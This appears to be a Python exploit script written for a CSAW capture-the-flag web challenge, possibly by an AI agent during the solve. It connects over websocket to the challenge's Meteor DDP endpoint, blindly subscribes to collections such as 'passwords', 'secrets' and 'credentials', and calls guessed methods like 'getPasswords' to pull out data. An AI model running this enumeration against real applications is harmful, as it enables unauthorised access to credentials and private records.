import websocket
import json
import time
import sys

def on_message(ws, message):
    print(f"Received: {message}")
    
def on_error(ws, error):
    print(f"Error: {error}")
    
def on_close(ws, close_status_code, close_msg):
    print("Connection closed")
    
def on_open(ws):
    print("Connection opened")
    # Send connect message
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1", "pre2", "pre1"]
    }
    ws.send(json.dumps(connect_msg))
    
    # Wait a bit for connection to establish
    time.sleep(1)
    
    # Try to subscribe to common collection names
    collections_to_try = ["notes", "passwords", "secrets", "users", "credentials"]
    
    for collection in collections_to_try:
        sub_id = f"sub_{collection}"
        sub_msg = {
            "msg": "sub",
            "id": sub_id,
            "name": collection,
            "params": []
        }
        print(f"Subscribing to {collection}...")
        ws.send(json.dumps(sub_msg))
        time.sleep(1)
    
    # Also try to call common methods
    methods_to_try = ["getNotes", "getAllNotes", "listNotes", "getPasswords"]
    
    for method in methods_to_try:
        method_id = f"method_{method}"
        method_msg = {
            "msg": "method",
            "id": method_id,
            "method": method,
            "params": []
        }
        print(f"Calling method {method}...")
        ws.send(json.dumps(method_msg))
        time.sleep(1)

if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(
        "ws://web.chal.csaw.io:5000/websocket",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    
    ws.run_forever()
end_of_edit

